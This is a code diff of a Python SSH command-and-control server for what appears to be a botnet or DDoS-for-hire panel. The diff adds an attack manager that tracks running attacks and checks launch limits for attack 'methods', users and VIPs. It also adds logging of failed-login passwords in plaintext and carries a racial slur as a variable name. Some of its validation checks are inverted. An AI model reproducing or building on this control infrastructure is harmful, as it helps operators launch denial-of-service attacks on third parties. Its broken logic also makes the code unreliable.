@@ -1,11 +1,10 @@
-# Lunna cnc source, feel free to modify whatever u want, just dont fucking copy
-# without giving the credits, ok?
+# CNC source, feel free to modify whatever u want
 
-# Version 1.0.0
+# Version 1.2.0
 
-import socket, random, base64, requests, threading, time, string, sys, os, json, hashlib, paramiko
+import socket, random, base64, requests, threading, time, string, sys, os, json, hashlib, paramiko, traceback
 import pyotp, qrcode, qrcode.console_scripts, pyfiglet # for captchas
-
+from datetime import datetime
 # - - - - - -
 # - - - - - -
 # Configs
@@ -13,15 +12,15 @@ import pyotp, qrcode, qrcode.console_scripts, pyfiglet # for captchas
 # - - - - - -
 
 serverkey = 'server.key'
+SSH_BANNER = "SSH-2.0-LunnaSSHservice_1.0"
 luc     = {}
-spinner = ['-', '\\', '|', '/']
 lives   = {}
 uptime = time.time()
-SSH_BANNER = "SSH-2.0-LunnaSSHservice_1.0"
 host_key = paramiko.RSAKey(filename=serverkey)
 if len(sys.argv) < 2:
     print('U need to put a port to start the script.')
     os.kill(os.getpid(), 9)
+
 # - - - - - -
 # - - - - - -
 # utils
@@ -282,13 +281,13 @@ L___________________J     \\ \\___\\/
 |            /                            \\             |
  \\          /                              \\           /
   \\________/                                \\_________/"""]}
+spinner        = ['-', '\\', '|', '/']
 super_users    = []
 vips           = []
 guest_users    = []
 blacklist      = []
 methods        = []
 attacks        = []
-usersattacks   = {}
 plans          = {}
 commands       = {}
 command_line   = ''
@@ -303,9 +302,14 @@ def loadConfigs(sock=False):
             sock.send(f' [{c.CYAN}Info{c.R}] Reloading...\r\n'.encode())
         with open('Settings/config.json', 'r') as arquivo:
             file = arquivo.read()
-        with open('Settings/funnel.json', 'r') as arquivo:
-            funnel = arquivo.read()
-            funnel = json.loads(funnel)
+        try:
+            with open('Settings/funnel.json', 'r') as arquivo:
+                funnel = arquivo.read()
+                funnel = json.loads(funnel)
+        except Exception as e:
+            print(f'[{c.BG_RED+c.WHITE}FATAL{c.R}] The settings > funnel.json file is corrupted, error:')
+            print(e)
+            os.kill(os.getpid(), 9)
         try:
             with open('Banners/cmd_line.tfx', 'r', encoding='utf-8') as arquivo:
                 cmd = arquivo.read()
@@ -327,56 +331,58 @@ def loadConfigs(sock=False):
         # apis          = x['apis']
         #plans         = x["plans_specifications"]
         command_line   = cmd
-        if sock:
-            sock.send(f' [{c.GREEN}Info{c.R}] Reloading CNC motd...\r'.encode())
+
+        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC motd...\r'.encode())
         if x["cnc_motd"] != motd:
             if sock:
-                sock.send(f' [{c.GREEN}OK{c.R}] CNC motd seted to {x["cnc_motd"]}\r'.encode())
-            print(f'[{c.RED}Info{c.R}] CNC motd seted to {x["cnc_motd"]}')
-        if sock:
-            sock.send('\r\n')
+                sock.send(f' [{c.GREEN}OK{c.R}] CNC motd seted to {x["cnc_motd"]}.\r'.encode())
+            print(f'[{c.YELLOW}Info{c.R}] CNC motd seted to {x["cnc_motd"]}.')
+        if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC motd reloaded.\r'.encode())
+        if sock: sock.send('\r\n')
+
         motd           = x["cnc_motd"]
-        if sock:
-            sock.send(f' [{c.GREEN}Info{c.R}] Reloading CNC name...\r'.encode())
+        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC name...\r'.encode())
         if x["cnc_name"] != cnc_name:
             if sock:
-                sock.send(f' [{c.GREEN}OK{c.R}] CNC name seted to {x["cnc_name"]}\r'.encode())
-            print(f'[{c.RED}Info{c.R}] CNC name seted to {x["cnc_name"]}')
-        if sock:
-            sock.send('\r\n')
-        cnc_name       = x["cnc_name"]
-        if sock:
-            sock.send(f' [{c.GREEN}Info{c.R}] Reloading cnc security level...\r'.encode())
-        if x["security_level"] != security_level and security_level <= 4 and security_level >= 0:
-            if sock:
-                sock.send(f' [{c.GREEN}OK{c.R}] CNC security level seted to {x["security_level"]}'.encode())
-            print(f'[{c.RED}Info{c.R}] CNC security level seted to {x["security_level"]}')
+                sock.send(f' [{c.GREEN}OK{c.R}] CNC name seted to {x["cnc_name"]}.\r'.encode())
+            print(f'[{c.YELLOW}Info{c.R}] CNC name seted to {x["cnc_name"]}.')
         else:
-            if sock:
-                sock.send(f' [{c.GREEN}Warn{c.R}] CNC security level seted to 0, invalid value on security_level'.encode())
-            print(f'[{c.GREEN}Warn{c.R}] CNC security level seted to 0, invalid value on security_level')
+            if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC name reloaded.          \r'.encode())
+
+        if sock: sock.send('\r\n')
+        cnc_name       = x["cnc_name"]
+
+        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading cnc security level...\r'.encode())
+        if x["security_level"] != security_level or x["security_level"] == security_level and security_level <= 4 and security_level >= 0:
+            if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC security level seted to {x["security_level"]}   \r'.encode())
+            print(f'[{c.YELLOW}Info{c.R}] CNC security level seted to {x["security_level"]}')
+            security_level = x["security_level"]
+        elif x["security_level"] == security_level:
+            if sock: sock.send(f' [{c.GREEN}OK{c.R}] Security parameters reloaded.\r'.encode())
+            print(f'[{c.YELLOW}Info{c.R}] CNC security parameters reloaded')
+        else:
+            if sock: sock.send(f' [{c.RED}Warn{c.R}] CNC security level seted to 0, invalid value on security_level'.encode())
+            print(f'[{c.RED}Warn{c.R}] CNC security level seted to 0, invalid value on security_level')
             security_level = 0
-        if sock:
-            sock.send('\r\n')
-        security_level = x["security_level"]
-        if sock:
-            sock.send(f' [{c.GREEN}Info{c.R}] Reloading CNC methods...\r'.encode())
-            if sock:
-                sock.send(f' [{c.GREEN}OK{c.R}] CNC methods reloaded with success\r'.encode())
-            print(f'[{c.RED}Info{c.R}] CNC methods reloaded.')
-        if sock:
-            sock.send('\r\n')
+
+        if sock: sock.send('\r\n')
+
+        if sock: sock.send(f' [{c.CYAN}Info{c.R}] Reloading CNC config and funnel...\r'.encode())
         methods        = funnel['methods']
         commands       = x["commands"]
         super_users    = x['superusers']
         vips           = x['vips']
         blacklist      = x['blacklist']
-        if sock:
-            sock.send(f'[{c.GREEN}Info{c.R}] Reload finished.\r\n'.encode())
+        if sock: sock.send(f' [{c.GREEN}OK{c.R}] CNC methods reloaded with success\r'.encode())
+        print(f'[{c.YELLOW}Info{c.R}] CNC methods reloaded.')
+
+        if sock: sock.send('\r\n')
+
+        if sock: sock.send(f' [{c.YELLOW}Info{c.R}] Reload finished.\r\n'.encode())
         # resellers     = x['resellers']
         # globalatks    = x['global']
     except Exception as e:
-        print(f'[{c.BG_RED+c.WHITE}FATAL{c.R}] The settings > config.json file is corrupted or something, double check it.')
+        print(f'[{c.BG_RED+c.WHITE}FATAL{c.R}] The settings > config.json file is corrupted, error:')
         print(e)
         os.kill(os.getpid(), 9)
 def receive(sock, lenght=1024, user=False, debug=False, returnset=False, limitc=False, justnumbers=False):
@@ -517,7 +523,7 @@ def receive(sock, lenght=1024, user=False, debug=False, returnset=False, limitc=
     return ''.join(nigga).replace('\r', '')
 def load(sock, user):
     global lives, cnc_name, motd
-    while True:
+    while lives[sock]:
         try:
             processedmotd = core.process(motd, sock, is_title=True)
             if not isinstance(processedmotd, list):
@@ -528,7 +534,7 @@ def load(sock, user):
                     settitle(sock, i)
                     time.sleep(0.75)
         except Exception as e:
-            print(f'The user: {user} exited')
+            print(f'[{c.RED}Info{c.R}] user "{user}" exited')
             try:
                 sock.close()
             except:
@@ -536,25 +542,18 @@ def load(sock, user):
             try:
                 del lives[sock]
             except Exception as e:
-                print(e)
+                pass
+                #print(e)
 
             return
+
 # - - - - - -
 # - - - - - -
 # Core
 # - - - - - -
 # - - - - - -
 
-class attackcore:
-    def arac(): # all running attaks core
-        global globalatks, attacks, usersattacks
-        while True:
-            try:
-                with open('Database/attacks.json') as x:
-                    x=x.read();x=json.loads(x)
-                globalatks = x['global']
-                attacks    = x['sent']
-class core:
+class core: # Main Core
     def rstring(length=4):
         characters = string.ascii_letters + string.digits
         random_string = ''.join(random.choice(characters)+' ' for _ in range(length))
@@ -564,7 +563,7 @@ class core:
         user = lives[sock]
         if '<%clear>' in data and is_title == False:
             clear(sock)
-        data = data.replace('<&user.name>', user['user']).replace('<&user.uptime>', core.getuptime(user['uptime'])).replace('<&user.concurrents>', str(user['concurrents'])).replace('<&user.boottime>', str(user['boottime'])).replace('<&user.until_expiry>', core.gettimeinto(int(time.time()), user['expiry'])).replace('<&user.createdby>', user['created_by'])
+        data = data.replace('<&user.name>', user['user']).replace('<&user.uptime>', core.getuptime(user['uptime'])).replace('<&user.concurrents>', str(user['concurrents'])).replace('<&user.boottime>', str(user['boottime'])).replace('<&user.until_expiry>', core.gettimeinto(int(time.time()), user['expiry'])).replace('<&user.createdby>', user['created_by']).replace('<&user.running>', str(amc.userattacks(user["user"])))
         data = data.replace('<&cnc.uptime>', core.getuptime(uptime)).replace('<&cnc.name>', cnc_name)
         data = data.replace('<%color.magenta>', c.MAGENTA).replace('<%color.reset>', c.R).replace('<%color.yellow>', c.YELLOW).replace('<%color.black>', c.BLACK).replace('<%color.white>', c.WHITE).replace('<%color.cyan>', c.CYAN).replace('<%color.red>', c.RED).replace('<%color.blue>', c.BLUE).replace('<%color.green>', c.GREEN).replace('<%color.bright.red>', c.BRIGHT_RED).replace('<%color.bright.blue>', c.BRIGHT_BLUE).replace('<%color.bright.green>', c.BRIGHT_GREEN).replace('<%color.bright.magenta>', c.BRIGHT_MAGENTA).replace('<%color.bright.yellow>', c.BRIGHT_YELLOW).replace('<%color.bright.cyan>', c.BRIGHT_CYAN).replace('&x1b', '\x1b').replace('<%clear>', '')
         data = data.replace('<%color.bg.white>', c.BG_WHITE).replace('<%color.bg.red>', c.BG_RED).replace('<%color.bg.green>', c.BG_GREEN).replace('<%color.bg.blue>', c.BG_BLUE).replace('<%color.bg.black>', c.BG_BLACK).replace('<%color.bg.magenta>', c.BG_MAGENTA).replace('<%color.bg.yellow>', c.BG_YELLOW).replace('<%color.bg.cyan>', c.BG_CYAN).replace('\n','\r\n')
@@ -584,7 +583,6 @@ class core:
                 return arquivo.read()
         except:
             return '<%color.red>Banner not found.<%color.reset>'
-
     def findsessions(user, addr):
         global lives
         for shit in list(lives.keys()):
@@ -596,7 +594,6 @@ class core:
         with open('Database/logins.json', 'r') as arquivo:
             x = json.load(arquivo)
         try:
-            x[username]
             if x[username]['password'] == hashlib.sha512(f'{password+x[username]["salt"]}'.encode()).hexdigest():
                     user        = username
                     concurrents = x[username]['concurrents']
@@ -605,7 +602,7 @@ class core:
                     disable     = x[username]['expiry']
                     return {"user":user, "concurrents":int(concurrents), "boottime":int(boottime), "created_by":createdby, "expiry": int(disable), "first": x[username]['first'], "otp": x[username]['otp']}
         except Exception as e:
-            print(e)
+            #print(e)
             return False
     def modifyuser(username, thing, value):
         with open('Database/logins.json', 'r') as arquivo:
@@ -724,6 +721,98 @@ class core:
             line = f''.join(['██' if cell else '  ' for cell in row])
             qr_list.append(c.BG_WHITE+c.BLACK+line+c.R)
         return secret, qr_list
+class amc: # AMC(Attacks Manager Core)
+    def arac(): # all running attacks core
+        global globalatks, attacks, usersattacks
+        while True:
+            try:
+                with open('Database/attacks.json') as x:
+                    x=x.read();x=json.loads(x)
+                globalatks = x['global']
+                attacks    = x['sent']
+                time.sleep(1.5)
+            except Exception as e:
+                print(f'[{c.RED}ERROR{c.R}] All running AMC broken.')
+                os.kill(os.getpid(), 9)
+    def userattacks(user="", m=1, ms=""): 
+        """
+         get user's attacks, with modes
+         m: mode
+         ms: mode string, used to mode 5
+          mode 1 =  gets only the counter of attacks running for the desired user ;3
+          mode 2 =  gets only the counter of all attacks sent by user >:3
+          mode 3 =  gets the json of the attacks running ;3
+          mode 4 =  gets the json of all attacks sent by user ~w~
+          mode 5 =  gets only the counter of attacks running in one method in the entire CNC ;3
+          mode 6 =  gets only the counter of attacks running in one method by a desired user ^w^
+        """
+        global globalatks, attacks, usersattacks
+        hits = 0
+        jeson = {
+            'hits':0,
+            'attacks': []
+            }
+        for i in attacks:
+            if m == 1:
+                if i["user"] == user and i["end"] > time.time():
+                    hits += i["concs_used"]
+            elif m == 2:
+                if i["user"] == user:
+                    hits += i["concs_used"]
+            elif m == 3:
+                if i["user"] == user and i["end"] > time.time():
+                    jeson["hits"] += i["concs_used"]
+                    jeson["attacks"].append(i)
+            elif m == 4:
+                if i["user"] == user:
+                    jeson["hits"] += i["concs_used"]
+                    jeson["attacks"].append(i)
+            if m == 5:
+                if i["method"] == ms and i["end"] > time.time():
+                    hits += i["concs_used"]
+            if m == 6:
+                if i["user"] == user and i["method"] == ms and i["end"] > time.time():
+                    hits += i["concs_used"]
+        return hits if m <= 2 else jeson
+    def launch(user, method, host, duration, port=0, concs=1, lenght=0):
+        method_info = next((m for m in funnel['methods'] if m['name'] == method), None)
+        if not method_info:
+            return False, "<%color.red>Method not found.<%color.reset>"
+        moderation = method_info['moderation']
+        if moderation['limit_attack_time'] and duration <= moderation['max_time']:
+            return False, f"<%color.red>Method duration reached the max: {moderation['max_time']}.<%color.reset>"
+
+        if duration >= funnel['minimum_time']:
+            return False, f"<%color.red>Method duration need to be at least {funnel['minimum_time']} seconds.<%color.reset>"
+
+        if concs > moderation['limit_concs_per_user']:
+            return False, "<%color.red>User reached the method max concurrents, try again later.<%color.reset>"
+
+        if concs > moderation['limit_concs_per_cnc']:
+            return False, "<%color.red>Method max concurrents reached, try again later.<%color.reset>"
+
+        if moderation['allow_length'] and lenght <= moderation['max_lenght'] and lenght >= 0:
+            return False, f"<%color.red>Method max/minimun lenght reached({moderation['max_lenght']}).<%color.reset>"
+        elif not moderation['allow_length'] and lenght:
+            return False, "<%color.red>Method don't allows lenght parameters.<%color.reset>"
+
+        if moderation['just_ips'] and not is_valid_ip(host):
+            return False, "<%color.red>Only ip's can be used on desired method.<%color.reset>"
+
+        if moderation['just_domains'] and not is_valid_domain(host):
+            return False, "<%color.red>Only domains can be used on desired method.<%color.reset>"
+
+        if not moderation['just_domains'] and port == 0:
+            port = moderation['default_port']
+
+        if moderation['admin_method'] and not is_admin(user):
+            return False, "<%color.red>Only administrators can use desired method.<%color.reset>"
+
+        if moderation['vip_method'] and not is_vip(user):
+            return False, "<%color.red>Only V.I.P's can use desired method.<%color.reset>"
+
+        return True, ""
+
 def handler(sock, user):
     global luc, lives
     luc[user] = []
@@ -745,19 +834,18 @@ def handler(sock, user):
                     sock.send(f' Exiting in {3-i} seconds\r')
                     time.sleep(1)
                 sock.close()
-                print(lives)
                 del lives[sock]
-                print(lives)
                 return
             elif command == 'echo':
-                    sock.sock('echo> ')
-                    x=receive(sock, user=user, debug=debugv)
-                    sock.send(f'\x1b[F{x}          \r\n'.encode())
+                sock.send('echo> ')
+                x=receive(sock, user=user, debug=debugv)
+                sock.send(f'\x1b[F{x}          \r\n'.encode())
             elif command.startswith('debug') and user in super_users:
                 if command.endswith('enable'):
                     if debugv == False:
                         debugv = True
                         sock.send(f'Debug activated, all infos will be showed as raw.\r\n'.encode())
+                        log('DebugFunction', f"account: {username} enable the debug function")
                     else:
                         sock.send(f'Ur debug is already enable.\r\n'.encode())
                 elif command.endswith('disable'):
@@ -769,11 +857,13 @@ def handler(sock, user):
                     sock.send(f'##########################\r\n'.encode())
             elif command == 'reload' and user in super_users:
                 loadConfigs(sock=sock)
+                log('Reloading', f"{username} reloaded the CNC")
             elif command == 'history':
                 for i in luc[user]:
                     sock.send(f'{i}\r\n'.encode())
             elif command in commands:
                 sock.send(core.process(core.banners(command), sock, addbreak=True))
+                log('Commands', f"{username} executed: {command}")
             else:
                 if not command.startswith('#'):
                     sock.send(f'This command do not exist.\r\n'.encode())
@@ -796,13 +886,13 @@ def login(sock, addr):
         transport.add_server_key(host_key)
         transport.start_server(server=server)
         sock = transport.accept(100)
-        settitle(sock, "Captcha")
         cred = server.get_credentials()
         username = cred['user']
         password = cred['passwd']
         response = ''
         finalx   = '' 
         if security_level != 0:
+            settitle(sock, "Captcha")
             sock.send(b'\033[0mcaptcha to confirm you\'re a human:\r\n')
         if security_level == 1:
             y, x = random.randint(1, 20), random.randint(1, 20)
@@ -833,6 +923,7 @@ def login(sock, addr):
             if otpshit[0] == 1:
                 magic, qcode = core.twofactor(username)
                 sock.send('Scan this with the preferred 2FA application, like google authenticator.\r\n')
+                sock.send(f'Secret: {magic}.\r\n')
                 sock.send('After that put the 6 digits code.')
                 for i in qcode:
                     sock.send(f'{i}\r\n'.encode())
@@ -868,7 +959,8 @@ def login(sock, addr):
             if check:
                 pass
             else:
-                sock.send(f'\r Invalid login or password.           \r'.encode())
+                sock.send(f'\r Invalid login or password.              \r'.encode())
+                log('LoginCore', f"Login failed: {username}:{password} | ip: {addr[0]}")
                 time.sleep(3)
                 sock.close()
                 return
@@ -893,7 +985,7 @@ def login(sock, addr):
                 "created_by": check['created_by'],
                 "expiry": check['expiry'],
             }
-            print(f"[{c.GREEN}Login{c.R}] {username} logged into botnet.")
+            print(f"[{c.GREEN}Login{c.R}] {username} logged in.")
             handler(sock, username)
         else:
             sock.send(f'Wrong answer, closing connection.'.encode())
@@ -901,7 +993,6 @@ def login(sock, addr):
             sock.close()
             return
     except Exception as e:
-        print(e)
         try:
             sock.close()
         except:
@@ -921,7 +1012,7 @@ def run_server():
 
 # - - - - - -
 # - - - - - -
-# Some shit, i dont even know why i put that right here
+# end ^w^
 # - - - - - -
 # - - - - - -
 
@@ -930,8 +1021,8 @@ if __name__ == "__main__":
         print(f'[{c.GREEN}Server{c.R}] Configs, funnels and logins exist.')
         print(f'[{c.GREEN}Server{c.R}] Starting config loader thread...')
         loadConfigs()
+        print(f'[{c.GREEN}Server{c.R}] Starting AMC(Attacks Manager Core) thread...')
+        threading.Thread(target=amc.arac).start()
         run_server()
     else:
         print(f'[{c.RED}Fatal{c.R}] u dont have the main settings files(Settings[config.json, funnel.json], Database[logins.json]).')
-
-# Coded by @imlumina(discord) @lunnalinks(telegram)
